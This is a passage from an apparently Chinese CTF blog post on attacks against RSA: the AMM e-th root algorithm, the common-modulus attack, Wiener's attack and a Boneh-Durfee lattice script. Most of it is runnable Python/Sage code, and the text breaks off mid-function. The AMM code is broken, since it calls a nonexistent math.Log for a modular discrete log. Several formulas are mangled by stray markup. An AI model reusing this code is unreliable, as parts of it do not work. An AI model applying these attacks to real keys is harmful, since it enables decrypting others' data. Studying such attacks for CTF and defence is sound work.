p)<br>$$</p><h4 id="e-2"><a href="#e-2" class="headerlink" title="e&gt;2"></a>e&gt;2</h4><p>对于<br>$$<br>x^e\equiv r(mod\ p)<br>$$<br>令p-1&#x3D;e^{s}t，则有<br>$$<br>r^{\frac{p-1}{e}}\equiv r^{e^{s-1}t}\equiv 1(mod\ p)<br>$$<br>此时可以找到δ，使得t|(eδ-1)，则<br>$$<br>r^{e^{s-1}(eδ-1)}\equiv 1(mod\ p)<br>$$</p><h5 id="当s-1时，-2"><a href="#当s-1时，-2" class="headerlink" title="当s&#x3D;1时，"></a>当s&#x3D;1时，</h5><p>$$<br>r^{(eδ-1)}\equiv 1(mod\ p)<br>$$</p><p>两边乘r，再开e次方<br>$$<br>r^\delta\equiv r^{\frac{1}{e}}\equiv x(mod\ p)<br>$$</p><h5 id="当s-1时，-3"><a href="#当s-1时，-3" class="headerlink" title="当s&gt;1时，"></a>当s&gt;1时，</h5><p>构造e次非剩余集合<br>$$<br>K_i&#x3D;\rho^{i<em>\frac{p-1}{e}}&#x3D;\rho^{i</em>e^{s-1}t},0\leq i\leq e-1<br>$$</p><p>$$<br>K_i^e&#x3D;\rho^{i<em>e^st}&#x3D;\rho^{i</em>(p-1)}<br>$$</p><p>所以根据欧拉定理，得<br>$$<br>\rho^{i*(p-1)}\equiv \rho^{(p-1)}\equiv1(mod\ p)<br>$$<br>由上面的式子又可以推知<br>$$<br>\begin{cases}K_i&#x3D;\rho^{\frac{i*(p-1)}{e}} \ K_{e-i}&#x3D;\rho^{\frac{(e-i)*(p-1)}{e}}\end{cases}<br>$$</p><p>$$<br>K_i<em>K_{e-i}&#x3D;\rho^{p-1}<br>$$<br>由欧拉定理又可以得到<br>$$<br>K_i</em>K_{e-i}\equiv 1(mod\ p)<br>$$<br>所以K_i和K_{e-i}互为逆元</p><p>对于前面这个式子<br>$$<br>r^{e^{s-1}(eδ-1)}\equiv 1(mod\ p)<br>$$<br>两边开e次方得到一个集合K中的数设为K_{e-j}<br>$$<br>r^{e^{s-2}(eδ-1)}\equiv K_{e-j}(mod\ p)<br>$$<br>两边乘上K_j然后开e次方<br>$$<br>r^{e^{s-2}(eδ-1)}K_j\equiv K_{e-j}K_j\equiv 1(mod\ p)<br>$$</p><p>$$<br>r^{e^{s-2}(eδ-1)}\rho^{j*e^{s-1}t}\equiv 1(mod\ p)<br>$$</p><p>反复进行上述操作，直至回到s&#x3D;1的情况<br>$$<br>r^{(eδ-1)}\rho^{ej_1+e^2j_2+…+e^{s-1}j_{s-1}}\equiv 1(mod\ p)<br>$$<br>两边乘r，开e次方<br>$$<br>r^δ\rho^{j_1+ej_2+…+e^{s-2}j_{s-1}}\equiv r^{\frac{1}{e}}\equiv x(mod\ p)<br>$$<br>将m和c代进去，得到<br>$$<br>c^δ\rho^{j_1+ej_2+…+e^{s-2}j_{s-1}}\equiv m(mod\ p)<br>$$<br>此时我们便得到了其中一个根，剩余的根可以通过不断乘上集合K得到.</p><p>当我们得到了所有的解以后，使用中国剩余定理对下面的方程组求解即可<br>$$<br>\begin{cases} m^e\equiv cp(mod\ p) \ m^e\equiv cq(mod\ q)\end{cases}<br>$$<br>python代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * <span class="comment"># pip install pycryptodome</span></span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="comment"># pip install gmpy2</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm <span class="comment"># pip install tqdm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">e, q</span>):</span><br><span class="line">    p = random.randint(<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> ((gmpy2.powmod(p, (q - <span class="number">1</span>) // e, q)) == <span class="number">1</span>):</span><br><span class="line">        p = random.randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_rth</span>(<span class="params">x, e, N</span>):</span><br><span class="line">    <span class="keyword">assert</span> ((N - <span class="number">1</span>) % e == <span class="number">0</span>)</span><br><span class="line">    p = onemod(e, N)</span><br><span class="line">    </span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = N - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (s % e == <span class="number">0</span>):</span><br><span class="line">        s = s // e</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    delta = (s * k + <span class="number">1</span>) // e</span><br><span class="line"></span><br><span class="line">    a = gmpy2.powmod(p, e ** (t - <span class="number">1</span>) * s, N)</span><br><span class="line">    b = gmpy2.powmod(x, e * delta - <span class="number">1</span>, N)</span><br><span class="line">    c = gmpy2.powmod(p, s ,N)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>, t)):</span><br><span class="line">        d = gmpy2.powmod(b, e ** (t - <span class="number">1</span> -i), N)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (- math.Log(d, a)) % e</span><br><span class="line">        b = b * (c ** (e ** j)) % N</span><br><span class="line">        h = h * (c ** j) % N</span><br><span class="line">        c = c ** e % N</span><br><span class="line">    result = gmpy2.powmod(x, delta, N) * h</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_ROOT2</span>(<span class="params">r, q</span>):  </span><br><span class="line">    list1 = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(list1) &lt; r):</span><br><span class="line">        p = gmpy2.powmod(random.randint(<span class="number">1</span>, q - <span class="number">1</span>), (q - <span class="number">1</span>) // r, q)</span><br><span class="line">        list1.add(p)</span><br><span class="line">    <span class="keyword">return</span> list1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_Solution</span>(<span class="params">m, q, rt, cq, e</span>):</span><br><span class="line">    mp = []</span><br><span class="line">    <span class="keyword">for</span> pr <span class="keyword">in</span> rt:</span><br><span class="line">        r = (pr * m) % q</span><br><span class="line">        mp.append(r)</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">mp, mq, e, p, q</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    t1 = gmpy2.invert(q, p)</span><br><span class="line">    t2 = gmpy2.invert(p, q)</span><br><span class="line">    <span class="keyword">for</span> mp1 <span class="keyword">in</span> mp:</span><br><span class="line">        <span class="keyword">for</span> mq1 <span class="keyword">in</span> mq:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">            ans = (mp1 * t1 * q + mq1 * t2 * p) % (p * q)</span><br><span class="line">            <span class="keyword">if</span> check(ans):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> flag_info <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">flag_info = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"></span><br><span class="line">mp = AMM_rth(cp, e, p)</span><br><span class="line">mq = AMM_rth(cq, e, q)</span><br><span class="line"></span><br><span class="line">rt1 = ALL_ROOT2(e, p)  </span><br><span class="line">rt2 = ALL_ROOT2(e, q)</span><br><span class="line"></span><br><span class="line">amp = ALL_Solution(mp, p, rt1, cp, e)  </span><br><span class="line">amq = ALL_Solution(mq, q, rt2, cq, e)</span><br><span class="line"></span><br><span class="line">calc(amp, amq, e, p, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;run over&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然，这里还得介绍一下sagemath中有一个很好用的方法.nth_root，可以非常有效地完成域下的高次开根</p><p>大概用法如下，可视情况做出修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">K=Zmod(n)</span><br><span class="line">x=K(c).nth_root(e,<span class="built_in">all</span>=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这样可以返回所有在模n整数环下，满足x^e ≡ c (mod n)的x</p><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>用于解决在GF(n)下，明文相同，公钥不同，而模n又很大难以分解的情况（两组公钥和密文已知）<br>$$<br>\begin{cases}m^{e_1}\equiv c_1(mod\ n) \ m^{e_2}\equiv c_2(mod\ n)\end{cases}<br>$$<br>两边分别同时乘s1,s2次方<br>$$<br>\begin{cases}m^{e_1s_1}\equiv c_1^{s_1}(mod\ n) \ m^{e_2s_2}\equiv c_2^{s_2}(mod\ n)\end{cases}<br>$$<br>两式相乘<br>$$<br>m^{e_1s_1+e_2s_2}\equiv c_1^{s_1}c_2^{s_2}(mod\ n)<br>$$<br>这里使用扩展欧几里得算法，我们可以找到能满足e1s1+e2s2&#x3D;1的s1和s2。又因为一般来说m&lt;n，所以<br>$$<br>m&#x3D;c_1^{s_1}c_2^{s_2}\ mod\ n<br>$$<br>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=</span><br><span class="line">e1=</span><br><span class="line">e2=</span><br><span class="line">c1=</span><br><span class="line">c2=</span><br><span class="line">_gcd,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n)%n</span><br></pre></td></tr></table></figure><h2 id="维纳攻击"><a href="#维纳攻击" class="headerlink" title="维纳攻击"></a>维纳攻击</h2><p>参考<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130515028">这篇文章</a></p><p>用于RSA中e很大的时候</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">n=</span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line">d=wienerAttack(e, n)</span><br><span class="line">m=<span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure><h2 id="Boneh-Durfee攻击"><a href="#Boneh-Durfee攻击" class="headerlink" title="Boneh Durfee攻击"></a>Boneh Durfee攻击</h2><p>类似维纳攻击，但可使d范围更大</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">debug = True</span><br><span class="line">strict = False</span><br><span class="line">helpful_only = True</span><br><span class="line">dimension_min = 7</span><br><span class="line">def helpful_vectors(BB, modulus):</span><br><span class="line">    nothelpful = 0</span><br><span class="line">    for ii in range(BB.dimensions()[0]):</span><br><span class="line">        if BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += 1</span><br><span class="line"> </span><br><span class="line">    print (nothelpful, &quot;/&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)</span><br><span class="line">def matrix_overview(BB, bound):</span><br><span class="line">    for ii in range(BB.dimensions()[0]):</span><br><span class="line">        a = (&#x27;%02d &#x27; % ii)</span><br><span class="line">        for jj in range(BB.dimensions()[1]):</span><br><span class="line">            a += &#x27;0&#x27; if BB[ii,jj] == 0 else &#x27;X&#x27;</span><br><span class="line">            if BB.dimensions()[0] &lt; 60:</span><br><span class="line">                a += &#x27; &#x27;</span><br><span class="line">        if BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += &#x27;~&#x27;</span><br><span class="line">        print (a)</span><br><span class="line">def remove_unhelpful(BB, monomials, bound, current):</span><br><span class="line">    if current == -1 or BB.dimensions()[0] &lt;= dimension_min:</span><br><span class="line">        return BB</span><br><span class="line">    for ii in range(current, -1, -1):</span><br><span class="line">        if BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = 0</span><br><span class="line">            affected_vector_index = 0</span><br><span class="line">            for jj in range(ii + 1, BB.dimensions()[0]):</span><br><span class="line">                if BB[jj, ii] != 0:</span><br><span class="line">                    affected_vectors += 1</span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line">            if affected_vectors == 0:</span><br><span class="line">                print (&quot;* removing unhelpful vector&quot;, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-1)</span><br><span class="line">                return BB</span><br><span class="line">            elif affected_vectors == 1:</span><br><span class="line">                affected_deeper = True</span><br><span class="line">                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):</span><br><span class="line">                    if BB[kk, affected_vector_index] != 0:</span><br><span class="line">                        affected_deeper = False</span><br><span class="line">                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-1)</span><br><span class="line">                    return BB</span><br><span class="line">    return BB</span><br><span class="line">def boneh_durfee(pol, modulus, mm, tt, XX, YY):</span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + 1 - u) # u = xy + 1</span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line">    UU = XX*YY + 1</span><br><span class="line">    gg = []</span><br><span class="line">    for kk in range(mm + 1):</span><br><span class="line">        for ii in range(mm - kk + 1):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line">    monomials = []</span><br><span class="line">    for polynomial in gg:</span><br><span class="line">        for monomial in polynomial.monomials():</span><br><span class="line">            if monomial not in monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    for jj in range(1, tt + 1):</span><br><span class="line">        for kk in range(floor(mm/tt) * jj, mm + 1):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift)</span><br><span class="line">    for jj in range(1, tt + 1):</span><br><span class="line">        for kk in range(floor(mm/tt) * jj, mm + 1):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    for ii in range(nn):</span><br><span class="line">        BB[ii, 0] = gg[ii](0, 0, 0)</span><br><span class="line">        for jj in range(1, ii + 1):</span><br><span class="line">            if monomials[jj] in gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line">    if helpful_only:</span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1)</span><br><span class="line">        nn = BB.dimensions()[0]</span><br><span class="line">        if nn == 0:</span><br><span class="line">            print (&quot;failure&quot;)</span><br><span class="line">            return 0,0</span><br><span class="line">    if debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    if det &gt;= bound:</span><br><span class="line">        print (&quot;We do not have det &lt; bound. Solutions might not be found.&quot;)</span><br><span class="line">        print (&quot;Try with highers m and t.&quot;)</span><br><span class="line">        if debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(2)</span><br><span class="line">            print (&quot;size det(L) - size e^(m*n) = &quot;, floor(diff))</span><br><span class="line">        if strict:</span><br><span class="line">            return -1, -1</span><br><span class="line">    else:</span><br><span class="line">        print (&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;)</span><br><span class="line">    if debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;)</span><br><span class="line">    BB = BB.LLL()</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;LLL is done!&quot;)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;looking for independent vectors in the lattice&quot;)</span><br><span class="line">    found_polynomials = False</span><br><span class="line">    for pol1_idx in range(nn - 1):</span><br><span class="line">        for pol2_idx in range(pol1_idx + 1, nn):</span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = 0</span><br><span class="line">            for jj in range(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line">            if rr.is_zero() or rr.monomials() == [1]:</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                print (&quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx)</span><br><span class="line">                found_polynomials = True</span><br><span class="line">                break</span><br><span class="line">        if found_polynomials:</span><br><span class="line">            break</span><br><span class="line">    if not found_polynomials:</span><br><span class="line">        print (&quot;no independant vectors could be found. This should very rarely happen...&quot;)</span><br><span class="line">        return 0, 0</span><br><span class="line">    rr = rr(q, q)</span><br><span class="line">    soly = rr.roots()</span><br><span class="line">    if len(soly) == 0:</span><br><span class="line">        print (&quot;Your prediction (delta) is too small&quot;)</span><br><span class="line">        return 0, 0</span><br><span class="line">    soly = soly[0][0]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[0][0]</span><br><span class="line">    return solx, soly</span><br><span class="line">def example(N,e,delta):</span><br><span class="line">    t = int((1-2*delta) * m)</span><br><span class="line">    X = 2*floor(N^delta)</span><br><span class="line">    Y = floor(N^(1/2))</span><br><span class="line">    